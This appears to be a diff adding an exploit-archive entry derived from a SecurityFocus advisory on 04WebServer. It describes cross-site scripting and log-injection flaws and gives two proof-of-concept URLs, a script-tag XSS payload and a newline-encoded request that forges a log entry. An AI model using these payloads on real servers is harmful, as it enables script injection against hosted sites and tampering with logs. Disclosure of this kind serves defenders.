@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/11652/info
+
+Multiple remote vulnerabilities reportedly affect 04WebServer. These issues are due to a failure of the application to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to carry out cross-site scripting attacks against any Web sites hosted on the affected server and to inject arbitrary characters into log files, potentially leading to corruption.
+
+To leverage the cross-site scripting issue:
+http://www.example.com/<script>alert('XSS');</script>
+
+To inject the log entry '[22;45;24] <192.168.1.3> (74,632) [?.?.?.?I?.?.?.?.?.] GET /hack' into the log file the following request is sufficient:
+http://www.example.com/a%0a[22;45;24]%20<192.168.1.3>%20(74,632)%20[%90%b3%8f%ed%82%c9%8f%49%97%b9%82%b5%82%dc%82%b5%82%bd]%20GET%20/hack
